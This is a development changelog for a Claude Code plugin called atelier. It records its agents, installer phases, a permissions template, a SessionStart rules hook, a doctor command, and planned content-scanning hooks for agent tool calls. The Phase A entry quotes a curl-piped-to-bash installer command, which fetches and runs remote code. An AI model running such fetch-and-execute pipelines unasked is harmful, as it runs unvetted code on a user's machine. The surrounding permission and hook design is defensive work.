- `agents/tester.md` (sonnet, color `yellow`, tools: `Read`, `Grep`, `Glob`, `Edit`, `Write`, `Bash`, `TodoWrite`). Authors unit + integration tests in the project's existing framework, runs the full lint + typecheck + test push gate from [PLAN.md §6](PLAN.md), and surfaces flakes rather than masking them. e2e/Playwright explicitly deferred to `e2e-runner` (M3.1).
- `agents/pr-author.md` (sonnet, color `cyan`, tools: `Read`, `Grep`, `Glob`, `Bash`, `TodoWrite`, `Skill`). Re-runs the push gate one more time, composes a Conventional Commits message, pushes only to `origin task/<id>-<slug>`, opens the PR via `gh pr create` with the standard description (roadmap ref, summary, validation checklist, screenshots placeholder), and moves the block from `IN_PROGRESS.md` → `HISTORY.md` in the same PR. Explicitly does **not** mark the PR auto-merge-ready (that gate requires `reviewer` from M3.2).

**Tests:** YAML frontmatter parses cleanly for all four files (`ruby -ryaml`). The official `plugin-dev` plugin's `validate-agent.sh` script passes on all four with only 3 cosmetic warnings — those are a false-positive from the script extracting only the first line of `description:` block scalars (`description: |`), the same shape used by Claude's own canonical `agent-creator.md` example. Tools list contains only known Claude Code tool names (`Read`, `Grep`, `Glob`, `Edit`, `Write`, `Bash`, `TodoWrite`, `Task`, `Skill`). End-to-end agent invocation will be exercised when M2.3 `/next-task` lands and the orchestrator can be reached from a slash command.

**Decisions captured:**
- **Operator rules not duplicated in each agent prompt.** PLAN.md §4 / §6 / §8 already load globally via the M1.5 `SessionStart` hook (`operator-rules.md`). Each agent's system prompt cites those sections by reference rather than re-stating them, so updates to the operator rules propagate without touching every agent file.
- **`Skill` and `Task` in the orchestrator's tool list, not `Agent`.** Claude Code's documented agent-invocation tool name inside an agent definition is `Task`; `Agent` is only the SDK-facing name. The `Skill` tool is what lets the orchestrator invoke `git-wt`, `task-discovery`, `safe-install`, etc.
- **Tester does not get `Skill`.** It does not need to invoke any skill — it operates entirely via `Bash` against the project's `pnpm` scripts. Least privilege.
- **Skeleton `README.md` files from M1.1 removed.** Manual smoke test surfaced that `agents/README.md` was being loaded as a phantom agent (`atelier:README · inherit`) in `/agents`. Same risk applied to `commands/README.md` (slash commands) and `skills/README.md` (skills). All six skeleton READMEs (`agents/`, `commands/`, `skills/`, `hooks/`, `templates/`, `scripts/`) deleted in the same PR — each directory now has real content that documents itself, so the one-line organizational note from M1.1 is no longer needed. Lesson for future skeleton scaffolding: do **not** drop a `README.md` inside a Claude Code auto-discovery directory (`agents/`, `commands/`, `skills/`) — it will be parsed as a definition.

**Follow-ups:**
- Real end-to-end smoke test (orchestrator routes implementer → tester → pr-author against a toy ROADMAP item) blocked on M2.2 (skills `task-discovery`, `pr-flow`, `safe-commit`) and M2.3 (`/next-task` slash command). Acceptance criterion "invoked from a slash command" is fully achievable only after M2.3 lands.
- `safe-install` mentions in the implementer/orchestrator prompts are forward references — the actual skill arrives in M2.2.

### M1.6 — `claude-roadmap-tools` extraction + shared catalog + `/doctor` — 2026-05-17
**PRs:** [#1 claude-roadmap-tools](https://github.com/AkaLab-Tech/claude-roadmap-tools/pull/1) (plugin published) · [#1 claude-plugins](https://github.com/AkaLab-Tech/claude-plugins/pull/1) (shared catalog) · [#11](https://github.com/AkaLab-Tech/atelier/pull/11) (atelier marketplace.json removed) · [#14](https://github.com/AkaLab-Tech/atelier/pull/14) (install.sh Phase C.2 already installed both plugins via shared catalog) · [#18](https://github.com/AkaLab-Tech/atelier/pull/18) (`/atelier:doctor` + M2.4 threat-model addendum + narrow doctor allows + this closure)

Final Phase 1 milestone. Promotes the ROADMAP/IN_PROGRESS/HISTORY tooling out of the maintainer's `~/.claude-personal/` into a public plugin (`AkaLab-Tech/claude-roadmap-tools`), registers every AkaLab-Tech plugin in a dedicated shared marketplace catalog repo (`AkaLab-Tech/claude-plugins`), drives both installs from `install.sh` Phase C.2, and ships the `/atelier:doctor` health check so operators can detect drift across the three artefacts they depend on (`atelier`, `claude-roadmap-tools`, `git-wt`).

**Delivered:**
- `AkaLab-Tech/claude-roadmap-tools` plugin and `AkaLab-Tech/claude-plugins` catalog repo (done in their own repos; this repo only references them).
- `install.sh` Phase C.2 already installs both plugins via the shared `akalab-tech` catalog (recognised retroactively — actually shipped in PR #14).
- `commands/doctor.md` (~140 lines) — pure-markdown slash command. Invoked as `/atelier:doctor` because Claude Code's built-in `/doctor` (CLI diagnostics) shadows the bare name. Six structured checks: two plugin-drift, one git-wt SHA, three host (legacy hooks / git-wt PATH / shellrc / `.npmrc` / `.atelier-config.json`). Reports `✓`/`✗`/`–` and prints exact remediation commands but never applies them.
- `templates/settings.template.json` allow list extended with 12 narrow patterns covering exactly the commands `/doctor` invokes. `Bash(gh api *)` is deliberately not allowed — only the specific endpoints (`releases/latest`, `tags`, `commits/main`) for the three known repos. Allow count: 50 → 62.
- `PLAN.md` §3 threat-model addendum (~76 lines) listing the exact pattern catalogue each M2.4 `PreToolUse` content-scanning hook checks (`scan-edit-write`, `scan-git-add`, `safe-package-change`) — match heuristic, action (Block/Warn/Ask), known false-positive surfaces per pattern. Implementation guardrails: pattern catalogues live in `hooks/patterns/<hook>.json`; every hook decision logs to `<worktree>/.task-log/hook-decisions.jsonl`. Carryover requirement from PR #16/#17 closed here.

**Tests:** `/atelier:doctor` run end-to-end on the maintainer's mac via `claude --plugin-dir <worktree>`. Produced the expected `✓`/`✗`/`–` report. Detected a real git-wt SHA drift (`ac88a32 → 8a734bc`, the maintainer's own upstream fix to `git wt rm`'s cwd-orphan bug). Plugin checks correctly emitted `–` because AkaLab-Tech/atelier and AkaLab-Tech/claude-roadmap-tools have no published releases/tags yet. Auxiliary checks resolved as expected for the maintainer's environment (`–` for `.npmrc` and `.atelier-config.json` since the maintainer's view is the atelier repo itself, not an operator-managed project).

**Decision captured during the PR:** the bare `/doctor` name collides with Claude Code's built-in `/doctor` (CLI install diagnostics). Plugin slash commands are namespaced as `<plugin-name>:<command-name>`, so `commands/doctor.md` in the atelier plugin is invoked as `/atelier:doctor`. The first end-to-end smoke test surfaced this — the user got the built-in's output instead. Documented in the command's intro paragraph and the PR description.

**Phase 1 (Foundation) closed with this PR.** All six M1.x milestones merged: M1.1 (#4), M1.2 (#5 + #11), M1.3 (six sub-PRs #7/#8/#12/#13/#14/#15), M1.4 (#16), M1.5 (#17), M1.6 (#18). The plugin now installs end-to-end on a clean Mac VM, both plugins coexist via the shared `akalab-tech` catalog, operator rules load via `SessionStart` hook, and `/atelier:doctor` reports drift. Next: Phase 2 (M2.1 agents, M2.2 skills, M2.3 slash commands, M2.4 content-scanning hooks).

**Follow-ups (carried forward):**
- Publish initial `v0.1.0` releases / tags on `AkaLab-Tech/atelier` and `AkaLab-Tech/claude-roadmap-tools` so the plugin drift checks can resolve to `✓`/`✗` instead of `–`. Not blocking — `/doctor` correctly handles the no-releases case today.
- M2.4 implementation will use the threat-model addendum as the authoritative pattern catalogue. The catalogue is reviewable as-is; tuning happens during the per-hook implementation sub-PRs.

### M1.5 — Plugin-shipped operator rules (`SessionStart` hook) — 2026-05-17
**PR:** [#17](https://github.com/AkaLab-Tech/atelier/pull/17)

Single-sub-PR Phase 1 milestone: ship the rules atelier's agents must follow on every task in an atelier-managed project. Mechanism revised mid-PR after re-reading the [Claude Code plugins reference](https://code.claude.com/docs/en/plugins-reference): a `CLAUDE.md` at the plugin root is **not** loaded as project context — the official path for unconditional context injection is a `SessionStart` hook whose stdout becomes context.

**Delivered:**
- `operator-rules.md` (plugin root) — clean markdown that condenses PLAN.md §4 (dep installs), §6 (push/PR/merge gates), §7 (agent chain), §8 (failure-recovery retry budget) into operator-facing prose (no maintainer content). ~95 lines.
- `hooks/load-operator-rules.sh` — bash script that `cat`s `operator-rules.md` to stdout. Path resolved via `${CLAUDE_PLUGIN_ROOT}` per the plugins reference. Fails soft on missing file (stderr note + exit 0) so a corrupted plugin never locks the operator out of a session.
- `hooks/hooks.json` — registers the `SessionStart` hook. Uses the documented exec-form command quoting around `${CLAUDE_PLUGIN_ROOT}`.

**Tests:** end-to-end validated by running `claude --plugin-dir <worktree>` and asking "What are the atelier operator rules?" — Claude responded with a faithful summary of all four sections, including verbatim phrases from `operator-rules.md`, which confirms hook discovery → SessionStart firing → stdout-to-context pipe → on-demand retrieval all work as designed. Also: `bash -n`, `shellcheck` (0.11.0), `jq empty hooks/hooks.json`, direct hook invocation with `CLAUDE_PLUGIN_ROOT=<worktree>`, missing-file fallback exit code.

**Decision captured during the PR:** the ROADMAP M1.5 entry literally said "ship a CLAUDE.md". The investigation surfaced that this approach does not actually load context (per the plugins reference, plugins contribute context via skills / agents / hooks, not CLAUDE.md). The implemented `SessionStart` hook is the official mechanism. Cost: ~500-800 tokens of context per session. Trade-off: token cost for autonomy guarantee accepted, since the rules apply to every atelier task and operators should never have to re-run install.sh to opt in to them.

**Follow-ups:**
- Threat-model addendum for M2.4 content-scanning hooks (carryover from PR #16) — still required before any matcher code in M2.4 lands.

### M1.4 — `settings.template.json` (static permissions matrix) — 2026-05-17
**PR:** [#16](https://github.com/AkaLab-Tech/atelier/pull/16)

Single-sub-PR Phase 1 milestone: materialize the allow / deny / ask permissions matrix from PLAN.md §3 at `templates/settings.template.json`. The template stays a template until M2.3 `/setup-project` / `/next-task` instantiate it per-task with the worktree path injected.

**Delivered:**
- `templates/settings.template.json` — 87 permission rules total: 33 deny, 4 ask, 50 allow. `defaultMode: acceptEdits`. `additionalDirectories: ["<worktree>"]` as the substitution placeholder. Faithful 1-to-1 mapping against PLAN.md §3.
- `PLAN.md` §3 gains a **"Defense-in-depth"** note: this matrix is the static layer (gates *which tool* can be called); the M2.4 hook suite is the dynamic layer (validates *content* of allowed tool calls). Neither alone is enough.
- `ROADMAP.md` M2.4 expanded from 2 hooks to 5 with three new content-scanning hooks — `scan-edit-write`, `scan-git-add`, `safe-package-change` — plus a pre-implementation note requiring a threat-model addendum in PLAN.md §3 before any matcher code lands.

**Tests:** `jq empty` validates the template parses as JSON; a sample instantiation (`sed 's|<worktree>|/tmp/sample|g' …`) substitutes the placeholder in every spot (additionalDirectories, Read/Edit/Write patterns) and the result re-parses cleanly. Real per-task instantiation by Claude Code is exercised when M2.3 `/next-task` lands.

**Decision captured during the PR:** the user pushed back on shipping a static-only permissions model — defense-in-perimeter is not defense-in-depth. The static template ships now; the dynamic content-validation hooks land with M2.4 (scope expanded in the same PR). Both layers must hold for a real attack to land.

**Follow-ups:**
- Threat-model addendum to PLAN.md §3 listing the exact pattern catalogue each M2.4 content-scanning hook checks — required before any matcher code in M2.4 lands.
- Real per-task instantiation validation by `/next-task` (M2.3) — confirms Claude Code accepts the substituted file.

### M1.3 — `install.sh` (Phases A + B + C.1 + C.2) — 2026-05-17
**PRs:** [#7](https://github.com/AkaLab-Tech/atelier/pull/7) (npmrc decision) · [#8](https://github.com/AkaLab-Tech/atelier/pull/8) (Phase A) · [#12](https://github.com/AkaLab-Tech/atelier/pull/12) (Phase B) · [#13](https://github.com/AkaLab-Tech/atelier/pull/13) (Phase C.1) · [#14](https://github.com/AkaLab-Tech/atelier/pull/14) (Phase C.2) · [#15](https://github.com/AkaLab-Tech/atelier/pull/15) (final verification + closure)

Phase 1 milestone: top-level installer that takes a fresh Mac (or Ubuntu best-effort) from "factory" to "ready to run atelier tasks". Implemented across 6 PRs.

**Delivered:**
- `install.sh` (548 lines) with strict mode + helpers + OS detection + 5 phases + verification block.
- **Phase A**: brew (mac) / apt (linux) installs of `git`, `gh`, `fnm`, `jq`, `fzf` + `corepack`-managed `pnpm`. Claude Code via Anthropic's official native installer (`curl -fsSL https://claude.ai/install.sh | bash`).
- **Phase B**: Claude OAuth (`claude auth login`) + GitHub HTTPS auth (`gh auth login --git-protocol https --skip-ssh-key`), idempotent via `claude auth status` / `gh auth status`, no-TTY-safe.
- **Phase C.1**: external `git-wt` install + SHA recording in `~/.local/state/atelier/git-wt.sha` for `/doctor` (M1.6); `.env*` in git global excludes; git identity prompts with current values as defaults (per PR #9), no-TTY-safe; shellrc hooks (`fnm env --use-on-cd`, `task() { claude "/next-task $*"; }`, `task-status` alias) injected into `~/.zshrc` / `~/.bashrc` via sentinel-bounded idempotent block, with unwritable-shellrc graceful fallback.
- **Phase C.2**: `claude plugin marketplace add AkaLab-Tech/claude-plugins` + `claude plugin install atelier@akalab-tech` + `claude plugin install claude-roadmap-tools@akalab-tech` (CLI verbs, not slash-commands), idempotent via `--json` + `jq`, with missing-claude / unauthed fallback that prints the manual commands and continues.
- **Verification block** (`phase_verify`): 6 `✓`/`✗` checks (`claude --version`, `claude auth status`, `gh auth status`, `git wt help`, both plugins installed) plus an inline note that `/doctor` lands in M1.6.

**Bugs discovered during testing & fixed in-flight:**
- `unzip` missing from apt deps (broke `fnm` install on a clean Ubuntu) — fixed in PR #8 commit `d40dd33`.
- git-wt SHA not recorded on idempotent re-runs (when git-wt was already on PATH from a manual install) — fixed in PR #13.
- Unwritable shellrc caused a fatal error mid-Phase-C.1 — fixed in PR #13 (warn with exact `sudo chown` command, skip, continue, exit 0).

**Decisions captured along the way:**
- npmrc supply-chain guardrails are per-project (written by `/setup-project` in M2.3), not global (PR #7).
- Marketplace name `akalab-tech` differs from plugin name `atelier` to avoid an `atelier@atelier` resolver collision (M1.2 / PR #5).
- Marketplace catalog moved to a dedicated `AkaLab-Tech/claude-plugins` repo so multiple AkaLab-Tech plugins can coexist under one marketplace (PR #11).
- `claude auth login` (CLI verb) instead of `/login` (slash command) for Phase B — slash commands only work inside an interactive `claude` session.
- `claude plugin …` (CLI verbs) instead of `/plugin …` (slash commands) for Phase C.2 — same rationale.

**Tests:** validated on macOS arm64 (Tart clean VM in PR #13 + maintainer's mac end-to-end across every sub-PR) and Ubuntu 24.04 ARM (Multipass clean VM in PR #8). `shellcheck` 0.11.0 clean across every sub-PR.

**Follow-ups:**
- `/doctor` slash command (tracked under M1.6) — turns the verification block into a callable plugin command and adds drift detection against `gh api repos/Miguelslo27/git-wt/commits/main` using the recorded SHA.
- A single clean-Mac-VM end-to-end run on squashed `main` as M7.x dogfood.
- Maintainer's `~/.zshrc` ownership keeps reverting to `root:wheel` periodically — outside atelier's scope, but worth tracking to root-cause (some installer or sudo invocation is touching it).

### M1.2 — Plugin manifest and marketplace — 2026-05-12
**PR:** [#5](https://github.com/AkaLab-Tech/atelier/pull/5)

Second Phase 1 milestone: stand up the plugin manifest and the marketplace catalog so atelier becomes installable via Claude Code's native plugin system.

**Delivered:**
- `.claude-plugin/plugin.json` — name `atelier`, version `0.1.0`, description, author (AkaLab-Tech), homepage, repository, keywords. No `skills` field (the default `skills/` scan path is sufficient; an explicit entry would only add a redundant scan).
- `.claude-plugin/marketplace.json` — vendor-scoped marketplace named `akalab-tech` with one plugin entry pointing at `source: "./"`. Plugin and marketplace names intentionally differ to avoid an `atelier@atelier` resolver collision discovered during validation.
- PLAN.md §1 step 11, §12, and ROADMAP.md M1.3 Phase C.2 updated for the new install command (`atelier@akalab-tech`).

**Tests:** end-to-end install validated in an operator Claude Code session — `/plugin marketplace add <worktree-path>` reported `Successfully added marketplace: akalab-tech`, `/plugin install atelier@akalab-tech` reported `✓ Installed atelier`, and `/reload-plugins` ran without manifest errors. `jq empty` validates both JSON files.

**Follow-ups:**
- Global `~/.npmrc` already has `ignore-scripts=true` (the guardrail PLAN.md §2 step 5 will enforce), which breaks the standalone `claude` CLI's native-binary postinstall (the user-facing `/plugin marketplace add` slash command in an existing Claude Code session works fine; only the standalone CLI does not). M1.3 (`install.sh`) must install Claude Code before applying the guardrail, or scope the guardrail to project-level npmrc instead of global.

### M1.1 — Repo skeleton — 2026-05-12
**PR:** [#4](https://github.com/AkaLab-Tech/atelier/pull/4)

First Phase 1 milestone: prepare the on-disk layout the plugin and host-OS layers will populate in M1.2–M1.5.

**Delivered:**
- Created `.claude-plugin/`, `agents/`, `skills/`, `commands/`, `hooks/`, `templates/`, `scripts/` at the repo root.
- Added a one-line `README.md` to each, naming its purpose.
- Tracking: removed M1.1 from `ROADMAP.md` and routed it through `IN_PROGRESS.md` to this entry.

**Tests:** `ls` shows the seven directories at the repo root; each contains a `README.md` whose first line names its purpose.

<!-- ## YYYY-MM

### Example title — YYYY-MM-DD
**PR:** [#N](https://github.com/<org>/<repo>/pull/N)

One- or two-sentence framing of why this PR existed.

**Delivered:**
- Bullet 1
- Bullet 2

**Tests:** one line on the validation done.

**Follow-ups:** (optional)
- Bullet
-->
